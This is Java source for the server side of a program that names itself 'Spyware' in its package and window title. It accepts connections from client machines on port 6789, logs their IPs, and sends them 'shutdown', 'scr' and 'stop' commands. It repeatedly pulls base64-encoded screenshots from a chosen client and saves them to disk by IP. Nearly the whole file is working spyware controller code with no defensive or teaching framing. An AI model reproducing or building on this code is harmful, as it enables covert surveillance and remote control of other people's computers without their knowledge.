/*
* To change this license header, choose License Headers in Project Properties.
* To change this template file, choose Tools | Templates
* and open the template in the editor.
*/
package spy.server;

import java.awt.BorderLayout;
import java.awt.Robot;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Base64;
import java.util.Date;
import java.util.HashMap;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JScrollPane;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.JSONValue;

/**
 *
 * @author Brothers
 */
public class Home extends javax.swing.JFrame implements Runnable {
    
    /**
     * Creates new form Home
     */
    public static HashMap<String,Socket> ipmap;
    
    public static byte[] decodeImage(String imageDataString) {
        return Base64.getDecoder().decode(imageDataString);
    }
    
    public Home() {
        ipmap=new HashMap();
        this.setVisible(true);
        initComponents();
        new Thread(this).start();
    }
    
    public void run() //throws Exception
    {
        int n,fact=1;
        try{
            ServerSocket ss = new ServerSocket(6789);
            System.out.println("server is listening at port 6789.....");
            serverstatus.append("server is listening at port 6789.....\n");
            while(true){
                Socket sock = ss.accept();
                System.out.println("Request accepted.");
                serverstatus.append("Request accepted.\n");
                clientstatus.append(sock.getRemoteSocketAddress().toString().substring(1).split(":")[0]+" client connected. \n");
                System.out.println(sock.getRemoteSocketAddress().toString().substring(1).split(":")[0]);
                ipmap.put(sock.getRemoteSocketAddress().toString().substring(1).split(":")[0],sock);
                //new Handler(sock);
            }
        }
        catch(IOException e){}
    }
    
    class Handler implements Runnable {
        byte[] mybytearray = new byte[1024];    //create byte array
        Socket sock;
        //Server server = new Server();
        Robot r;
        int down;
        Runtime runtime; Process process;
        int bytesRead;
        Handler (Socket s){
            this.sock=s;
            System.out.println(s.getRemoteSocketAddress().toString());
            
            new Thread(this).start();
            System.out.println("Thread created.");
            serverstatus.append("Thread created.\n");
        }
        
        public void run(){
            try{
                r = new Robot();
                //r.delay(2000);
                while(true)
                {
                    InputStream inputStream = sock.getInputStream();
                    PrintWriter toclient = new PrintWriter(sock.getOutputStream(),true);
                    bytesRead = inputStream.read(mybytearray, 0, mybytearray.length);
                    System.out.println("up");
                    String str = new String(mybytearray);
                    
//                    if(str.contains("s"))
//                    {
//                        System.out.println("shutdown....");
//                        serverstatus.append("Client shutdown....\n");
//                        runtime = Runtime.getRuntime();
//                        process = runtime.exec("shutdown s");
//                    }
                    str = null;
                    
                    sock.close();
                    toclient.println("ok");
                }
            }
            catch (IOException e){			}//notify(e.toString());}//e.printStackTrace();}
            catch(Exception ex) {			}//notify(ex.toString()); }///ex.printStackTrace(); }
        }
    }
    
    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jPanel1 = new javax.swing.JPanel();
        jPanel2 = new javax.swing.JPanel();
        jLabel1 = new javax.swing.JLabel();
        mainpanel = new javax.swing.JPanel();
        jScrollPane1 = new javax.swing.JScrollPane();
        serverstatus = new javax.swing.JTextArea();
        jScrollPane2 = new javax.swing.JScrollPane();
        clientstatus = new javax.swing.JTextArea();
        shutdown = new javax.swing.JButton();
        screenshots = new javax.swing.JButton();
        cip = new javax.swing.JTextField();
        jLabel2 = new javax.swing.JLabel();
        jButton1 = new javax.swing.JButton();
        jPanel3 = new javax.swing.JPanel();
        jScrollPane3 = new javax.swing.JScrollPane();
        jMenuBar1 = new javax.swing.JMenuBar();
        jMenu3 = new javax.swing.JMenu();
        jMenuItem2 = new javax.swing.JMenuItem();
        jMenuItem3 = new javax.swing.JMenuItem();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Spyware");
        getContentPane().setLayout(new java.awt.CardLayout());

        jLabel1.setFont(new java.awt.Font("Tahoma", 1, 36)); // NOI18N
        jLabel1.setText("Spyware");

        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
        jPanel2.setLayout(jPanel2Layout);
        jPanel2Layout.setHorizontalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addGap(289, 289, 289)
                .addComponent(jLabel1)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel2Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel1)
                .addContainerGap(26, Short.MAX_VALUE))
        );

        serverstatus.setColumns(20);
        serverstatus.setRows(5);
        jScrollPane1.setViewportView(serverstatus);

        clientstatus.setColumns(20);
        clientstatus.setRows(5);
        jScrollPane2.setViewportView(clientstatus);

        shutdown.setText("shutdown");
        shutdown.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                shutdownActionPerformed(evt);
            }
        });

        screenshots.setText("Start Screenshots");
        screenshots.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                screenshotsActionPerformed(evt);
            }
        });

        jLabel2.setText("Client IP");

        jButton1.setText("Stop");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout mainpanelLayout = new javax.swing.GroupLayout(mainpanel);
        mainpanel.setLayout(mainpanelLayout);
        mainpanelLayout.setHorizontalGroup(
            mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(mainpanelLayout.createSequentialGroup()
                .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 363, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(mainpanelLayout.createSequentialGroup()
                        .addGap(48, 48, 48)
                        .addComponent(jLabel2)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(cip, javax.swing.GroupLayout.PREFERRED_SIZE, 135, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(36, 36, 36)
                        .addComponent(jButton1)))
                .addGap(16, 16, 16)
                .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(mainpanelLayout.createSequentialGroup()
                        .addComponent(screenshots)
                        .addGap(18, 18, 18)
                        .addComponent(shutdown)
                        .addGap(0, 0, Short.MAX_VALUE))
                    .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 366, Short.MAX_VALUE)))
        );
        mainpanelLayout.setVerticalGroup(
            mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(mainpanelLayout.createSequentialGroup()
                .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addComponent(jScrollPane2, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, 207, Short.MAX_VALUE)
                    .addComponent(jScrollPane1, javax.swing.GroupLayout.Alignment.LEADING))
                .addGap(18, 18, 18)
                .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(shutdown)
                    .addComponent(screenshots)
                    .addComponent(cip, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel2)
                    .addComponent(jButton1))
                .addGap(0, 14, Short.MAX_VALUE))
        );

        javax.swing.GroupLayout jPanel3Layout = new javax.swing.GroupLayout(jPanel3);
        jPanel3.setLayout(jPanel3Layout);
        jPanel3Layout.setHorizontalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane3)
        );
        jPanel3Layout.setVerticalGroup(
            jPanel3Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 151, Short.MAX_VALUE)
        );

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(mainpanel, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addComponent(jPanel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addComponent(jPanel2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(mainpanel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addContainerGap())
        );

        getContentPane().add(jPanel1, "card2");

        jMenu3.setText("File");

        jMenuItem2.setText("Change Password");
        jMenuItem2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem2ActionPerformed(evt);
            }
        });
        jMenu3.add(jMenuItem2);

        jMenuItem3.setText("Exit");
        jMenuItem3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jMenuItem3ActionPerformed(evt);
            }
        });
        jMenu3.add(jMenuItem3);

        jMenuBar1.add(jMenu3);

        setJMenuBar(jMenuBar1);

        pack();
        setLocationRelativeTo(null);
    }// </editor-fold>//GEN-END:initComponents
    
    private void jMenuItem3ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem3ActionPerformed
        // TODO add your handling code here:
        System.exit(0);
    }//GEN-LAST:event_jMenuItem3ActionPerformed
    
    private void jMenuItem2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jMenuItem2ActionPerformed
        // TODO add your handling code here:
        ChangePwd cp=new ChangePwd();
        cp.setVisible(true);
    }//GEN-LAST:event_jMenuItem2ActionPerformed
    
    private void shutdownActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_shutdownActionPerformed
        // TODO add your handling code here:
        if(cip.getText().equals("")){
            JOptionPane.showMessageDialog(null,"Please enter client IP.","Alert",JOptionPane.INFORMATION_MESSAGE);
        }else{
            Socket s=ipmap.get(cip.getText().trim());
            try {
                BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream()));
                PrintWriter w = new PrintWriter(s.getOutputStream(), true);
                w.println("shutdown");
                w.flush();

            } catch (IOException ex) {
                Logger.getLogger(Home.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }//GEN-LAST:event_shutdownActionPerformed
    
    private void screenshotsActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_screenshotsActionPerformed
        // TODO add your handling code here:
        if(cip.getText().equals("")){
            JOptionPane.showMessageDialog(null,"Please enter client IP.","Alert",JOptionPane.INFORMATION_MESSAGE);
        }else{
        Socket s=ipmap.get(cip.getText().trim());
        cip.setText("");
            Thread thread = new Thread() {
                public void run() {
                    try {
                        
                        while(true){
                        String line=null;
                        BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream()));

                        PrintWriter w = new PrintWriter(s.getOutputStream(), true);
                        w.println("scr");
                        w.flush();
                        String jdata = r.readLine();
                        System.out.println("status "+jdata);
                        JSONObject obj1 = (JSONObject) JSONValue.parse(jdata);
                        System.out.println("object "+obj1.toString());

                        String name = obj1.get("filename").toString();
                        String image = obj1.get("image").toString();

                        //convert from base64 to byte array
                        byte[] imageByteArray = decodeImage(image);

                        //convert byte array to a file image
                        File directory=new File("C:\\output\\"+cip.getText());
                        System.out.println("Directory exist: "+directory.exists());
                        if(directory.exists()){

                        }else{
                            directory.mkdir();
                        }
                        FileOutputStream imageOutFile = new FileOutputStream("C:\\output\\"+cip.getText()+"\\"+cip.getText()+"_"+name);
                        serverstatus.append("C:\\output\\"+cip.getText()+"\\"+cip.getText()+"_"+name+" screenshot created...\n");
                        imageOutFile.write(imageByteArray);
                        imageOutFile.close();
                        Thread.sleep(5000);
                        //JOptionPane.showMessageDialog(null,"Screenshot Downloaded.","Alert",JOptionPane.INFORMATION_MESSAGE);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            };
            thread.start();
    
        }
//            File file = new File("C:/output/"+cip.getText()+"/");
//            String[] imageNames = file.list();
//            clientstatus.append("Total client screenshots : "+imageNames.length+"\n");
       
    }//GEN-LAST:event_screenshotsActionPerformed

    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed
        // TODO add your handling code here:
        if(cip.getText().equals("")){
            JOptionPane.showMessageDialog(null,"Please enter client IP.","Alert",JOptionPane.INFORMATION_MESSAGE);
        }else{
            Socket s=ipmap.get(cip.getText().trim());
            try {
                BufferedReader r = new BufferedReader(new InputStreamReader(s.getInputStream()));
                PrintWriter w = new PrintWriter(s.getOutputStream(), true);
                w.println("stop");
                w.flush();

            } catch (IOException ex) {
                Logger.getLogger(Home.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }//GEN-LAST:event_jButton1ActionPerformed
    
    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
        * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html
        */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(Home.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>
        //</editor-fold>
        
        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new Home();
            }
        });
    }
    
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JTextField cip;
    private javax.swing.JTextArea clientstatus;
    private javax.swing.JButton jButton1;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JMenu jMenu3;
    private javax.swing.JMenuBar jMenuBar1;
    private javax.swing.JMenuItem jMenuItem2;
    private javax.swing.JMenuItem jMenuItem3;
    private javax.swing.JPanel jPanel1;
    private javax.swing.JPanel jPanel2;
    private javax.swing.JPanel jPanel3;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JPanel mainpanel;
    private javax.swing.JButton screenshots;
    private javax.swing.JTextArea serverstatus;
    private javax.swing.JButton shutdown;
    // End of variables declaration//GEN-END:variables
}
